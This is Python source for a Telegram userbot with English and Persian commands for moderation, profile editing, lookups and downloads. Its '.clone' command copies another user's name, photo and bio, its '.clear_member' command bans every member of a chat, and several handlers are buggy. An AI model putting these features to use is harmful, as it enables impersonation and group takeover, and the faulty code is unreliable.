#_________________________Welcome Mode___________________________________
@app.on_message(filters.new_chat_members,group=6)
def welcomebot(app, m:Message) :
 text = m.text 
 a = json_read("data.json")
 welcome_kos = read("welcome_add_text.txt")
 welcome_message = (f"""Hello {m.from_user.mention} !\nWelcome To **{m.chat.title}** 👋😼\n📆Date: `{date.today().strftime("%Y/%m/%d")}`\n⌛️Time: `{datetime.now(timezone("Asia/Tehran")).strftime("%H:%M:%S")}`\n{welcome_kos if welcome_kos else ""}""")
 if a["welcome"] == "on":
   app.send_message(m.chat.id , welcome_message)
#_________________________Weiki___________________________________  
@app.on_message(filters.me & filters.regex(f'^(.wiki)'), group=14)
def wiki(client,message):
    from wikipedia import set_lang, summary
    set_lang('en')
    result = summary("".join(message.text.split()[1::]))
    message.reply(result)
    audio = gTTS(text=result , lang='en')
    audio.save("voice.ogg")
    app.send_audio(message.chat.id , "voice.ogg", caption="◤✧Function: #wikipedaia text to Voice◥\n◣✧Language:English Lang◢")
    os.remove(f"voice.ogg")
@app.on_message(filters.me & filters.regex(f'^(ویکی)'), group=14)
def wiki(client,message):
    from wikipedia import set_lang, summary
    set_lang('fa')
    result = summary("".join(message.text.split()[1::]))
    message.reply(result)
    
#88888888888888888888888888888888888888888888888888888888888888888888888
incorrect_parameters = """Incorrect Parameters, you can lock these=
    "msg"
    "stickers"
    "gifs"
    "media"
    "games"
    "inline"
    "url"
    "polls"
    "info"
    "invite"
    "pin"
"""
@app.on_message(filters.command("hlock", ".") & filters.me)
def locktypes(app, message: Message):
    app.send_message(message.chat.id , """you can lock these=
    "msg"
    "stickers"
    "gifs"
    "media"
    "games"
    "inline"
    "url"
    "polls"
    "info"
    "invite"
    "pin""" , reply_to_message_id=message.id)
data = {
    "msg": "can_send_messages",
    "stickers": "can_send_other_messages",
    "gifs": "can_send_other_messages",
    "media": "can_send_media_messages",
    "games": "can_send_other_messages",
    "inline": "can_send_other_messages",
    "url": "can_add_web_page_previews",
    "polls": "can_send_polls",
    "info": "can_change_info",
    "invite": "can_invite_users",
    "pin": "can_pin_messages",
}


async def current_chat_permissions(app, chat_id):
    perms = []
    perm = (await app.get_chat(chat_id)).permissions
    if perm.can_send_messages:
        perms.append("can_send_messages")
    if perm.can_send_media_messages:
        perms.append("can_send_media_messages")
    if perm.can_send_other_messages:
        perms.append("can_send_other_messages")
    if perm.can_add_web_page_previews:
        perms.append("can_add_web_page_previews")
    if perm.can_send_polls:
        perms.append("can_send_polls")
    if perm.can_change_info:
        perms.append("can_change_info")
    if perm.can_invite_users:
        perms.append("can_invite_users")
    if perm.can_pin_messages:
        perms.append("can_pin_messages")

    return perms


async def tg_lock(
    app, message: Message, permissions: list, perm: str, lock: bool
):
    if lock:
        if perm not in permissions:
            return await message.edit_text("Already locked.")
        permissions.remove(perm)
    else:
        if perm in permissions:
            return await message.edit_text("Already Unlocked.")
        permissions.append(perm)

    permissions = {perm: True for perm in list(set(permissions))}

    try:
        await app.set_chat_permissions(
            message.chat.id, ChatPermissions(**permissions)
        )
    except ChatNotModified:
        return await message.edit_text(
            "To unlock this, you have to unlock 'messages' first."
        )

    await message.edit_text(("Locked." if lock else "Unlocked."))


@app.on_message(filters.command(["lock", "unlock"], ".") & filters.me)
async def locks_func(app, message: Message):
    if len(message.command) != 2:
        return await message.edit_text(incorrect_parameters)

    chat_id = message.chat.id
    parameter = message.text.strip().split(None, 1)[1].lower()
    state = message.command[0].lower()

    if parameter not in data and parameter != "all":
        return await message.edit_text(incorrect_parameters)

    permissions = await current_chat_permissions(app, chat_id)

    if parameter in data:
        await tg_lock(
            app,
            message,
            permissions,
            data[parameter],
            bool(state == "lock"),
        )
    elif parameter == "all" and state == "lock":
        await app.set_chat_permissions(chat_id, ChatPermissions())
        await message.edit_text(f"Locked Everything in {message.chat.title}")

    elif parameter == "all" and state == "unlock":
        await app.set_chat_permissions(
            chat_id,
            ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True,
                can_send_polls=True,
                can_change_info=False,
                can_invite_users=True,
                can_pin_messages=False,
            ),
        )
        await message.edit(f"Unlocked Everything in {message.chat.title}")


@app.on_message(filters.command("locks", ".") & filters.me)
async def locktypes(app, message: Message):
    permissions = await current_chat_permissions(app, message.chat.id)

    if not permissions:
        return await message.edit("No Permissions.")

    perms = ""
    for i in permissions:
        perms += f" • __**{i}**__\n"

    await message.edit_text(perms)
#----------------------------translate------------------------------------
@app.on_message(filters.command("translate") & filters.me, group=29)
def translate_text(client, message):
    try:
        # Get the target language and text to be translated from the message
        lang, text = message.text.split(maxsplit=1)[1].split(" ", maxsplit=1)

        # Translate the text to the target language
        translator = Translator(to_lang=lang)
        translation = translator.translate(text)

        # Send the audio file and caption with original and translated text
        message.reply(f"Original Text: {text}\nTranslated Text: {translation}")

        # Delete the audio file
    except Exception as e:
        message.reply_text(f"An error occurred: {e}")
        
#-----------------------%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@app.on_message(
    filters.command("imdb") & filters.me, group=8
)
def imdb_query(client, message):  # sourcery no-metrics
    """To fetch imdb data about the given movie or series."""
    catmessage =  message.edit("❅__**Wait**__")
    try:
        movie_name = message.text.split("/imdb")[1]
        movies = imdb.search_movie(movie_name)
        movieid = movies[0].movieID
        movie = imdb.get_movie(movieid)
        moviekeys = list(movie.keys())
        for i in mov_titles:
            if i in moviekeys:
                mov_title = movie[i]
                break
        for j in reversed(mov_titles):
            if j in moviekeys:
                mov_ltitle = movie[j]
                break
        mov_runtime = movie["runtimes"][0] + " min" if "runtimes" in movie else ""
        if "original air date" in moviekeys:
            mov_airdate = movie["original air date"]
        elif "year" in moviekeys:
            mov_airdate = movie["year"]
        else:
            mov_airdate = ""
        mov_genres = ", ".join(movie["genres"]) if "genres" in moviekeys else "Not Data"
        mov_rating = str(movie["rating"]) if "rating" in moviekeys else "Not Data"
        mov_rating += (
            " (by " + str(movie["votes"]) + ")"
            if "votes" in moviekeys and "rating" in moviekeys
            else ""
        )
        mov_countries = (
            ", ".join(movie["countries"]) if "countries" in moviekeys else "Not Data"
        )
        mov_languages = (
            ", ".join(movie["languages"]) if "languages" in moviekeys else "Not Data"
        )
        mov_plot = (
            str(movie["plot outline"]) if "plot outline" in moviekeys else "Not Data"
        )
        mov_director =  get_cast("director", movie)
        mov_composers =  get_cast("composers", movie)
        mov_writer =  get_cast("writer", movie)
        mov_cast =  get_cast("cast", movie)
        mov_box =  get_moviecollections(movie)
        resulttext = f"""
<b>❅<i>Title : </i></b><code>{mov_title}</code>
<b>❅<i>Imdb Url : </i></b><a href='https://www.imdb.com/title/tt{movieid}'>{mov_ltitle}</a>
<b>❅<i>Info : </i></b><code>{mov_runtime} | {mov_airdate}</code>
<b>❅<i>Genres : </i></b><code>{mov_genres}</code>
<b>❅<i>Rating : </i></b><code>{mov_rating}</code>
<b>❅<i>Country : </i></b><code>{mov_countries}</code>
<b>❅<i>Language : </i></b><code>{mov_languages}</code>
<b>❅<i>Director : </i></b><code>{mov_director}</code>
<b>❅<i>Music Director </i>: </b><code>{mov_composers}</code>
<b>❅<i>Writer : </i></b><code>{mov_writer}</code>
<b><i>❅Stars : </i></b><code>{mov_cast}</code>
<b>❅<i>Box Office : </i></b>{mov_box}
<b>❅<i>Story Outline : </i></b><i>{mov_plot}</i>"""
        if "full-size cover url" in moviekeys:
            imageurl = movie["full-size cover url"]
        else:
            imageurl = None
        soup = BeautifulSoup(resulttext, features="html.parser")
        rtext = soup.get_text()
        if len(rtext) > 1024:
            extralimit = len(rtext) - 1024
            climit = len(resulttext) - extralimit - 20
            resulttext = resulttext[:climit] + "...........</i>"
        if imageurl:
            downloader = SmartDL(imageurl, moviepath, progress_bar=False)
            downloader.start(blocking=False)
            while not downloader.isFinished():
                pass
        if os.path.exists(moviepath):
            app.send_photo(
                message.chat.id,
                moviepath,
                caption=resulttext,
            )
            os.remove(moviepath)
            return  catmessage.delete()
            catmessage.edit(
            resulttext,
            link_preview=False,
        )
    except IndexError:
         catmessage.edit(f"__**❅This Movie Not Found{movie_name}.**__")
    except Exception as e:
         catmessage.edit(f"__**❅Error:**__\n__{e}__")

#_________________________Auto Answer___________________________________
@app.on_message(filters.text,group=6)
def autoanwer(app, m:Message):
  text = m.text 
  a = json_read("data.json")
  if a["autoan"] == "on":
   if text in answer:
    num = answer.index(text)
    app.send_message(m.chat.id , javab[num], reply_to_message_id=m.id)
    sleep(9)
    num = 0
    
@app.on_message(filters.me | users & filters.text , group=336)
def updates(app, m:Message):
 global api
 global enemy
 global love
 global mutey
 global lang
 global now
 text = m.text 
#_+_+_+_++++++++++++++++++++++++++++++++++++++++++++++++++++
#________________________________Text Mode______________________________
 json_database = json_read("data.json")
 if (json_database["boldmode"] == "on"):
  m.edit_text(f"**{text}**")
 elif (json_database["italicmode"] == "on"):
  m.edit_text(f"__{text}__")
 elif (json_database["codemode"] == "on"):
  m.edit_text(f"`{text}`")
 elif (json_database["underline"] == "on"):
  m.edit_text(f"<u>{text}</u>")
 elif (json_database["emojimode"] == "on"):
  m.edit_text(f"{text} {choice(ez_emoji)}")
 elif (json_database["strike"] == "on"):
  m.edit_text(f"~~{text}~~")
 elif (json_database["spoilermode"] == "on"):
  m.edit_text(f"||{text}||")
 elif (json_database["quotemode"] == "on"):
  m.edit_text(f"```{text}```")
 elif (json_database["mention"] == "on"):
  m.edit_text(f"<a href=tg://user?id={m.chat.id}>{text}</a>")
#________________________________Font______________________________
 elif text.startswith(".pvlock"):
  if text.split()[1] == "on":
   json_database.update({"pvlock":"on"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❋ Pv Lock is **ON**")
  if text.split()[1] == "off":
   json_database.update({"pvlock":"off"})
   write("data.json", json.dumps(json_database))
   m.edit_text(f"❋ Pv Lock is **OFF**")
  else:
   m.edit_text(f"❋ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❋")
  
#------&&&&&--------------------------------------------------------------------
 elif text.startswith(".addadmin"):
   if len(users) <= 1:
    try:
        user_id_get = (m.reply_to_message.chat.id if m.reply_to_message else app.get_users(text.split()[1]).id)
        user = app.invoke(functions.users.GetFullUser(id=app.resolve_peer(user_id_get)))
        a = user.users[0].first_name if user.users[0].first_name else "--"
        users.add(int(user_id_get))
        app.send_message(m.chat.id, f"User {a} Added to Admin List", reply_to_message_id=m.id)
        
    except Exception as er:
      m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   else:
     app.send_message(m.chat.id, f"**You Can Add only 2 Admin For UserBot**", reply_to_message_id=m.id)
     

   
 elif text.startswith(".deladmin"):
   try:
        user_id_get = (m.reply_to_message.chat.id if m.reply_to_message else app.get_users(text.split()[1]).id)
        user = app.invoke(functions.users.GetFullUser(id=app.resolve_peer(user_id_get)))
        a = user.users[0].first_name if user.users[0].first_name else "--"
        users.remove(int(user_id_get))
        app.send_message(m.chat.id, f"User {a} Deleted from Admin List", reply_to_message_id=m.id)
   except Exception as er:
    m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".adminlist"):
   app.send_message(m.chat.id, f"Admin List :\n{users}", reply_to_message_id=m.id)
 elif text.startswith(".clearadminlist"):
   app.send_message(m.chat.id, f"Admin List :\n{users} cleared", reply_to_message_id=m.id)
   users.clear()
  #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


#________________________________Clone User______________________________
 elif text.startswith(".clone"):
   try:
    if m.reply_to_message:
     userSelfp = m.reply_to_message.chat.id
     b = app.invoke(functions.users.GetFullUser(id=app.resolve_peer(userSelfp)))
     kiri = app.get_users(m.reply_to_message.chat.id)
     user_id_get = m.reply_to_message.chat.id
    else:
     text = text.replace(" ","").replace(".clone","")
     user_id_get = app.get_users(text).id
     kiri = app.get_users(user_id_get)
     b = app.invoke(functions.users.GetFullUser(id=app.resolve_peer(user_id_get)))
    app.edit_message_text(m.chat.id , m.id , text=f"""
    **Cloner**
❖ `Firstname`⤳ (`{b.users[0].first_name if b.users[0].first_name else '--'}`)
❖ `Lastname`⤳ (`{(b.users[0].last_name if b.users[0].last_name else '--')}`)
❖ `Bio`⤳ (`{(b.full_user.about if b.full_user.about else '--')}`)""")
    loudo = app.download_media(kiri.photo.big_file_id)
#    photos = app.get_chat_photos("me")
#    app.delete_profile_photos(photos[0].file_id)
#down = app.download_media(kiri.photo.big_file_id)
    app.set_profile_photo(photo=loudo)
    app.update_profile(first_name=b.users[0].first_name)
    app.update_profile(last_name=(b.users[0].last_name if b.users[0].last_name else ""))
    app.update_profile(bio=(b.full_user.about if b.full_user.about else ""))
    app.edit_message_text(m.chat.id , m.id , "❖ Clone Successfully Completed")
    os.remove(loudo)
   except errors.exceptions.bad_request_400.UsernameNotOccupied: 
    app.send_message(m.chat.id , f"❖ Username Not Valid ❖") 
   except Exception as er:
    m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".block"):
  app.block_user(m.reply_to_message.chat.id if m.reply_to_message else text.split()[1])
  m.edit_text(f"❖ {(m.reply_to_message.from_user.mention if m.reply_to_message else f'<a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a>')} Blocked ") 

 elif text.startswith(".unblock"):
  app.unblock_user(m.reply_to_message.chat.id if m.reply_to_message else text.split()[1])
  m.edit_text(f"❖ {(m.reply_to_message.from_user.mention if m.reply_to_message else f'<a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a>')} Unblocked ") 

 elif text.startswith(".left"):
  try:
   if text.split()[1]:
    app.leave_chat( text.split()[1] , delete=True)
    m.edit_text(f"❖ Successfully Left From [ `{text.split()[1]}` ]")
   else:
    app.send_message(m.chat.id , f"Bye :)") 
    app.leave_chat(m.chat.id , delete=True) 
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
 elif text.startswith(".join "):
  try:
   link = text.replace(".join ","")
   link = link.replace('+','joinchat/')
   app.join_chat(link)
   app.send_message(m.chat.id , f'❖ Successfully Joined To [ {link} ]' ,disable_web_page_preview=True)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
 elif text == ".delethistory":
  try: 
   app.invoke(functions.channels.DeletHistory(app.resolve_peer(channel=m.chat.id)))
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
  else:
   app.send_message(m.chat.id , f"❖ Chat Leared") 

 elif text.startswith(".ban"):
  try:
   app.ban_chat_member(m.chat.id , (m.reply_to_message.chat.id if m.reply_to_message else text.split()[1]))
   app.send_message(m.chat.id , f"❖ User {(m.reply_to_message.from_user.mention if m.reply_to_message else f'<a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a>')} Successfully Banned !")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
 elif text.startswith(".unban"):
  try:
   app.unban_chat_member(m.chat.id , (m.reply_to_message.chat.id if m.reply_to_message else text.split()[1]))
   app.send_message(m.chat.id , f"❖ User {(m.reply_to_message.from_user.mention if m.reply_to_message else f'<a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a>')} Successfully UnBanned !")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith((".clear_member","پاکسازی ممبر")):
   target = text.split()[1]
   m.edit_text(f"❖ Target Chat: `{target}`\n__Start Ban members__ . . .")
   for member in app.get_chat_members(target):
     try:
       app.ban_chat_member(target , member.user.id)
     except errors.FloodWait as e:
       app.send_message("me",f"❖ Wait For {e.x} Seconds")
       sleep(e.x)
       app.send_message("me",f"❖ **Flood Wait Has Ended**🥳\nSend [ `.clear_member {target}` ] Again")
     except errors.exceptions.bad_request_400.UserAdminInvalid:
       app.send_message("me",f"**❖ You Are Not Admin in** ( `{target}` )")
       pass
     except errors.exceptions.bad_request_400.BadRequest:
       app.send_message("me",f"**❖ Clear Members of ( {target} ) Has Been Ended**")
       pass
     except Exception as er:
       app.send_message("me",f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith((".delmute","حذف سکوت")):
  try:
   app.unban_chat_member(m.chat.id , (m.reply_to_message.chat.id if m.reply_to_message else text.split()[1]))
   app.send_message(m.chat.id , f"❖ User {(m.reply_to_message.from_user.mention if m.reply_to_message else f'<a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a>')} Successfully UnMuted !")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith((".setmute","تنظیم سکوت")):
   try:
    app.restrict_chat_member(m.chat.id, m.reply_to_message.chat.id, ChatPermissions())
    app.send_message(m.chat.id , f"❖ User {(m.reply_to_message.from_user.mention if m.reply_to_message else f'<a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a>')} Muted")
   except:
    m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")

 elif text.startswith((".setchatphoto","تنظیم پروفایل گروه")):
   try:
     if m.reply_to_message.photo:
       app.set_chat_photo(chat_id=m.chat.id,photo=m.reply_to_message.photo.file_id)
       app.send_message(m.chat.id , f"❖ Chat Photo Changed")
     else:
       app.set_chat_photo(chat_id=m.chat.id,video=m.reply_to_message.video.file_id)
       app.send_message(m.chat.id , f"❖ Chat Photo Changed")
   except:
     m.edit_text(f"❖ Please Reply To Photo or Video")

 elif text.startswith((".setprofile","تنظیم پروفایل")):
  try:
    if m.reply_to_message.photo:
     down = app.download_media(m.reply_to_message)
     app.set_profile_photo(photo=down)
     app.send_message(m.chat.id , f"❖ Your Profile Photo Changed")
     os.remove(down)
    elif m.reply_to_message.video:
     down = app.download_media(m.reply_to_message)
     app.set_profile_photo(video=down)
     app.send_message(m.chat.id , f"❖ Your Profile Video Changed")
     os.remove(down)
    else:
     app.send_message(m.chat.id , f"❖ Please Reply To Message")
  except Exception as er:
    m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith((".delprofile","حذف پروفایل")):
  try:
    photos = app.get_chat_photos("me")
    app.delete_profile_photos(next(photos).file_id)
    app.send_message(m.chat.id , f"❖ Your Profile photo Deleted")
  except Exception as er:
    m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif ".delchatphoto" == text or "حذف پروفایل گروه" == text:
  try:
   app.delete_chat_photo(m.chat.id)
   m.reply(f"❖ Chat Photo Cleared")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".setchattitle"):
  try:
   kx = text.replace(".setchattitle" , "")[1::]
   app.set_chat_title(m.chat.id, kx.strip())
   m.reply(f"❖ Chat Name changed To[ `{kx}` ]")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith("تنظیم نام گروه"):
  try:
   kx = text.replace("تنظیم نام گروه" , "")[1::]
   app.set_chat_title(m.chat.id, kx.strip())
   m.reply(f"❖ Chat Name changed To[ `{kx}` ]")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
 elif text.startswith(".setchatbio"):
  try:
   kx = text.replace(".setchatbio","")[1::]
   app.set_chat_description(m.chat.id, kx)
   m.reply(f"❖ Chat Bio changed To [ `{kx}` ]")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
 elif text.startswith("تنظیم بیو گروه"):
  try:
   kx = text.replace("تنظیم بیو گروه","")[1::]
   app.set_chat_description(m.chat.id, kx)
   m.reply(f"❖ Chat Bio changed To [ `{kx}` ]")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif ".pin" == text or "پین" == text:
  if m.reply_to_message:
   try:
    m.pin(disable_notification=False)
    m.edit_text(f'❖ Pinned')
   except Exception as er:
    m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
  else:
   m.edit_text(f"❖ Please Reply To Message")

 elif ".unpin" == text or "حذف پین" == text:
   try:
    chat_id = m.chat.id
    reply_message = m.reply_to_message
    app.unpin_chat_message(chat_id, reply_message)
    m.edit_text("❖ Unpinned")
   except Exception as e:
    m.edit_text(f"❖ ERROR: {e}")


 elif ".unpinall" == text or "حذف همه پین" == text:
  try:
   app.unpin_all_chat_messages(m.chat.id)
   m.edit_text(f'❖ All Message Unpinned')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith((".setchatusername","تنظیم یوزرنیم گروه")):
  try:
   kx = text.split()[1]
   app.set_chat_username(m.chat.id, kx)
   m.edit_text(f'❖ Chat Username Changed [ `{kx}` ]')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")   

 elif text.startswith((".creatchannel","ساخت کانال")):
  try:
   kx = text.split()[1]
   app.create_channel(title=f'{kx}')
   m.edit_text(f'❖ Channel [ `{kx}` ] Created')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith((".creatsupergroup","ساخت گروه")):
  try:
   kx = text.split()[1]
   app.create_supergroup(title=f'{kx}')
   m.edit_text( f'❖ Supergroup [ `{kx}` ] Created')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".creatgroup"):
  try:
   kx = text.split()[1]
   app.create_group(title=f'{kx}')
   m.edit_text( f'❖ Group [ `{kx}` ] Created')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   

 elif text.startswith((".delallmsguser","حذف کل")):
  try:
   app.delete_user_history(m.chat.id , (m.reply_to_message.chat.id if m.reply_to_message else text.split()[1]))
   m.edit_text(f"All message From {(m.reply_to_message.from_user.mention if m.reply_to_message else f'<a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a>')} Deleted")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith((".slowmod","حالت آرم")):
  try:
   kx = text.split()[1]
   app.set_chat_description(m.chat.id, int(kx))
   m.edit_text( f'❖ Slow Mode is on Second : {kx}')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".setname"):
  try:
   kx = text.replace(".setname","")[1::]
   app.invoke(functions.account.UpdateProfile(first_name=kx))
   write("user.txt" , text.replace(".setname","")[1::])
   m.edit_text(f'❖ Your Name ɪs Updated To [ `{kx}` ]')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
 elif text.startswith(".setlastname"):
  try:
   kx = text.replace(".setlastname","")[1::]
   app.invoke(functions.account.UpdateProfile(last_name=kx))
   m.edit_text(f'❖ Your Lastname is Updated To [ `{kx}` ]')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
 elif text.startswith(".setbio"):
  try:
   kx = text.replace(".setbio","")[1::]
   app.invoke(functions.account.UpdateProfile(about=kx))
   write("userbio.txt" , text.replace(".setbio","")[1::])
   m.edit_text(f'❖ Your Bio Updated To⤳[ `{kx}` ]')
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")


   


 elif text.startswith(".welcome_add"):
  write("welcome_add_text.txt" , text.replace(".welcome_add" , "")[1::])
  m.edit_text(f"❖ Successfully Added To Welcome Message")
 
 elif text.startswith("تنظیم خوشامد"):
  write("welcome_add_text.txt" , text.replace("تنظیم خوشامد" , "")[1::])
  m.edit_text(f"❖ Successfully Added To Welcome Message")
  
 elif text.startswith(".welcome_reset"):
  write("welcome_add_text.txt" , "")
  m.edit_text(f"❖ Successfully Welcome Message Reset")

 elif text.startswith(".welcome_show"):
  m.edit_text(read("welcome_add_text.txt"))


 elif text.startswith(".getip"):
  try:
   HOSTNAME = m.reply_to_message.text if m.reply_to_message else text.split()[1]
   app.edit_message_text(m.chat.id, m.id, f'❖ The [`{HOSTNAME}`] iP address is [`{gethostbyname(HOSTNAME)}`]')
  except:
   app.edit_message_text(m.chat.id, m.id, f'❖ The `{HOSTNAME}` Not valid !!')
   
 elif text.startswith(".whoisip"):
  try:
   HOSTIP = m.reply_to_message.text if m.reply_to_message else text.split()[1]
   source = location(ip=HOSTIP, key=None)
   app.edit_message_text(m.chat.id, m.id, f"""
❖ `iP` ⤳  (`{source["ip"]}`)
❖ `City` ⤳  (`{source["city"]}`)
❖ `Region` ⤳  (`{source["region"]}`)
❖ `Country` ⤳  (`{source["country"]}`)\n(`{source["country_name"]}`)
❖ `Area Code` ⤳  (`{source["country_calling_code"]}`)
❖ `Language` ⤳  (`{source["languages"]}`)
❖ `Owner` ⤳  (`{source["org"]}`)""")
  except:
   app.edit_message_text(m.chat.id, m.id, f'❖ The `{HOSTIP}` Not valid !!')

 elif text.startswith(".firstcomment"):
  try:
   if text.split()[1] == "on":
    json_database.update({"firstcom":"on"})
    write("data.json", json.dumps(json_database))
    m.edit_text(f"❖ First comment is **ON**")
   elif text.split()[1] == "off":
    json_database.update({"firstcom":"off"})
    write("data.json", json.dumps(json_database))
    m.edit_text(f"❖ First comment is **OFF**")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".antich"):
  try:
   write("anti_del_chat.txt" , text.split()[1])
   m.edit_text(f"֍ 𝗢𝗸 :)\nChat ID: `{text.split()[1]}`") 
  except Exception as er:
   m.edit_text(f"├ • `ERROR` ⤳\n(`{er}`)") 

 elif text.startswith(".mention"):
  if m.reply_to_message:
   try:
    m.edit_text(f"{m.reply_to_message.from_user.mention}") 
   except:
    m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")
  else:
   try:
    m.edit_text(f"<a href=tg://user?id={app.get_users(text.split()[1]).id}>{app.get_users(text.split()[1]).first_name}</a>") 
   except:
    m.edit_text(f"❖ ʀᴇsᴜʟᴛs [ `ᴇʀʀᴏʀ` ] ❖")

 elif text == ".dl":
  try:
   down = app.download_media(m.reply_to_message)
   if m.reply_to_message.caption:
    caption=m.reply_to_message.caption
   else:
    caption=""
   app.send_document(m.chat.id , down , caption=caption)
   os.remove(down)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text == "waitt":
  try:
   down = app.download_media(m.reply_to_message)
   app.send_document("me" , down , caption="😈")
   os.remove(down)
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")
   
#-------------------------------------------------
 elif text == ".unzip":
        file_name =  m.reply_to_message.download()
        edited =  app.send_message(m.chat.id, "file : \n downloads->")
        sleep(1)
        app.edit_message_text(edited.chat.id, edited.id, 'file : \n downloads->extractfiles->')
        with zipfile.ZipFile(file_name, 'r') as zip_ref:
            zip_ref.extractall('templ')
        count = 0
        for root, dirs, files in os.walk('templ'):
            for name in files:
                filename = os.path.join(root, name)
                count += 1
                if os.path.getsize(filename) == 0:
                    os.remove(filename)
                    continue
                app.send_document(m.chat.id, filename, caption="file %s in zip" % count)
                os.remove(filename)
        app.edit_message_text(edited.chat.id, edited.id,'file : \n downloads->extractfiles->exracted->uploading->uploaded')
        for name in dirs:
                dirname = os.path.join(root, name)
                if not os.listdir(dirname):
                    os.rmdir(dirname)

#-------------------------------------------------

 elif text == ".tp":
  try:
    down = app.download_media(m.reply_to_message)
    if down == None:
     m.edit_text(f"**ERROR!**\n\n__Please Reply To A Sticker__")
    else:
     os.rename(down ,'sticker.jpg')
     app.send_photo(m.chat.id , f"sticker.jpg" ,caption="**Sticker** To **Picture** By WenosSelf", reply_to_message_id=m.id)
     os.remove(f"sticker.jpg")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text == ".ts":
  try:
    down = app.download_media(m.reply_to_message)
    if down == None:
     m.edit_text(f"**ERROR!**\n\n__Please Reply To A Photo__")
    else:
     os.rename(down ,'sticker.webp')
     app.send_sticker(m.chat.id , f"sticker.webp" , reply_to_message_id=m.id)
     os.remove(f"sticker.webp")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text == ".tg":
  try:
    down = app.download_media(m.reply_to_message)
    if down == None:
     m.edit_text(f"**ERROR!**\n\n__Please Reply To A Photo__")
    else:
     os.rename(down ,'animation.gif')
     app.send_animation(m.chat.id , f"animation.gif" , reply_to_message_id=m.id)
     os.remove(f"animation.gif")
  except Exception as er:
   m.edit_text(f"❖ **ERROR** :\n(`{er}`)")

 elif text.startswith(".dllink"):
  i = 1
  url=(m.reply_to_message.text if m.reply_to_message else text.split()[1])
  try:
   if url.find('/'):
    filename=url.split('/')[-1]
    r = GET(url, allow_redirects=True , stream=True)
    total = int(r.headers.get('content-length'))
    app.edit_message_text(m.chat.id , m.id , f"""𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱\n❖ ғɪʟᴇ ɴᴀᴍᴇ : `{filename}`\n❖ ғɪʟᴇsɪᴢᴇ : `{total/1024/1024:.3f} ᴍʙ`\n❖ ᴛɪᴍᴇ : `{datetime.now(timezone("Asia/Tehran")).strftime("%H:%M")}`\nㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ\n❖ ᴡᴀɪᴛ ғᴏʀ ᴅᴏᴡɴʟᴏᴀᴅ""")
    with open(filename, 'wb') as file:
     for data in r.iter_content(chunk_size=1024):
      size = file.write(data)
